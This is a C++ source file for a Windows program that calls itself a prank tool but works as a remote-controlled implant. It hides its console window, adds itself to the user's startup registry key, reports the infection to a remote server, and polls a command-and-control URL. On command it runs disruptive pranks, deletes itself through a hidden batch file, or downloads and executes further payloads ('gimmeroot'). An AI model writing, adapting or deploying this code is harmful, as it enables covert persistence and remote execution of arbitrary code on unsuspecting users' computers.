// crane.cpp�: d�finit le point d'entr�e pour l'application console.
//

#include "stdafx.h"
#include <iostream>
#include "EvilPranks.h"
#include "Registry.h"
#include "Constants.h"
#include "Logger.h"
#include "Downloader.h"

//link winmm.lib (-lwinmm)

#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"")
//hide console =D 
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")


#pragma comment(lib,"winmm")

void DelMe(std::string path)
{
	std::string command = "cmd / c ping localhost - n 3 > nul & del " + path;
	system(command.c_str());
}
// this is the name of the temporary .bat file
static const char tempbatname[] = "_uninsep.bat";

void Selfdestruct()
{
	//THIS WORKS, TAKEN FROM : http://www.codeproject.com/Articles/4027/Writing-a-self-destructing-exe-file
	//THIS NEEDS TO BE CLEANED

	// temporary .bat file
	static char templ[] =
		":Repeat\r\n"
		"del \"%s\"\r\n"
		"if exist \"%s\" goto Repeat\r\n"
		"rmdir \"%s\"\r\n"
		"del \"%s\"";


	char modulename[_MAX_PATH];    // absolute path of calling .exe file
	char temppath[_MAX_PATH];      // absolute path of temporary .bat file
	char folder[_MAX_PATH];

	GetTempPath(_MAX_PATH, temppath);
	strcat_s(temppath, tempbatname);

	GetModuleFileName(NULL, modulename, MAX_PATH);
	strcpy_s(folder, modulename);
	char *pb = strrchr(folder, '\\');
	if (pb != NULL)
		*pb = 0;

	HANDLE hf;

	hf = CreateFile(temppath, GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hf != INVALID_HANDLE_VALUE)
	{
		DWORD len;
		char *bat;

		bat = (char*)alloca(strlen(templ) +
			strlen(modulename) * 2 + strlen(temppath) + 20);

		wsprintf(bat, templ, modulename, modulename, folder, temppath);

		WriteFile(hf, bat, strlen(bat), &len, NULL);
		CloseHandle(hf);

		ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
	}
}

void slowMouse() {
	int i = 1;
	SystemParametersInfo(SPI_SETMOUSESPEED,
		0,
		(LPVOID)i,
		SPIF_UPDATEINIFILE ||
		SPIF_SENDCHANGE ||
		SPIF_SENDWININICHANGE);
}

void crazyMouse() {
	int i;
	for (i = 0; i<50; i++) {
		SetCursorPos(rand() % 1367, rand() % 769);
		Sleep(200);
	}
}

void beep() {
	int i;
	for (i = 0; i<50; i++) {
		Beep(rand() % 12000, rand() % 500);
	}
}

void openCDTray() {
	mciSendString("set cdaudio door open", 0, 0, 0);
	mciSendString("set cdaudio door open", 0, 0, 0);
}

void swapMouseButtons() {
	SwapMouseButton(true);
}

int main(int argc, const char* argv[])
{
	//first item of argv[] returns the path to our binary
	std::string executable_path = argv[0];
	int flag = 0;
	int timeWindow = 0;

	//make our app starting up with Windows
	int result = Registry::setStringValue(HKEY_CURRENT_USER, Constants::START_UP_KEY, Constants::EXECUTABLE_NAME, executable_path);

	//This allows me to know wether you got p0wned or not.
	Logger logger;
	logger.addTitle("WinPrank");
	logger.addEntry("Hello World");
	logger.addSection("Details :");
	logger.addEntry("Installation path : " + executable_path);
	logger.addEntry("Registry alteration returned : " + StringUtils::intToString(result));
	logger.uploadReport();

	while (1) {
		try {
			std::string response = HTTPRequest::sendRequest("GET", Constants::URL_HOST.c_str(), Constants::URL_COMMAND_AND_CONTROL.c_str(), NULL, NULL);
			if (response.substr(0, response.size()-1) == "yesyoucan") {
				//And now my Watch in ended, shall I begin?
				EvilPranks::setMaxVolume(Constants::MAX_VOLUME, true);
				EvilPranks::beEvil();
				Sleep(180 * 1000);
				std::cout << "Done sleeping !!" << std::endl;
			}
			else if (response.substr(0, response.size() - 1) == "harakiri") {
				
				std::cout << "I must go !" << std::endl;

				//self-delete
				std::cout << Registry::removeAppFromStartup(Constants::EXECUTABLE_NAME) <<std::endl;
				Selfdestruct();
		
				exit(0);
			}

			else if (response.substr(0, response.size() - 1) == "gimmeroot") {
				
				//we don't want this part to execute more than once
				if (flag == 1 && timeWindow < 6) {
					Sleep(30 * 1000);
					timeWindow++;
					continue;

				}

				//reset the possibility to reuse the chrdmp after 3 minutes
				if (timeWindow >= 6) {
					timeWindow = 0;
					flag = 0;
				}

				flag = 1;
				//int counter = 0;
				Downloader downloader;
				//std::string temp_dir = Files::getTempDir();
				std::vector<std::string> payloads = downloader.getPayloadsList();

				if (payloads.empty()) {
					Logger::uploadReport();
					return -1;
				}
				downloader.dropExecute(payloads);

				/*std::string ret = Files::readFile(temp_dir + "\\scout_report.txt");
				while (ret == "error-file" && counter < 25) {
					Sleep(500);
					ret = Files::readFile(temp_dir + "\\scout_report.txt");
					counter++;
				}

				Logger::addEntry(ret); //*/
				Sleep(5000);
				downloader.cleanUp(payloads);
			}

			else if (response.substr(0, response.size() - 1) == "beep") {
				EvilPranks::setMaxVolume(Constants::MAX_VOLUME, true);
				beep();
				Sleep(30 * 1000);
			}

			else if (response.substr(0, response.size() - 1) == "1337") {
				crazyMouse();
				slowMouse();
				swapMouseButtons();
				openCDTray();
				Sleep(30 * 1000);
			}

			else	{
				std::cout << response << std::endl;
				Sleep(30 * 1000);
			}
		}

		catch (std::exception const& e) {
			Logger::addError(e.what());
		}
	}

	return 0;
}

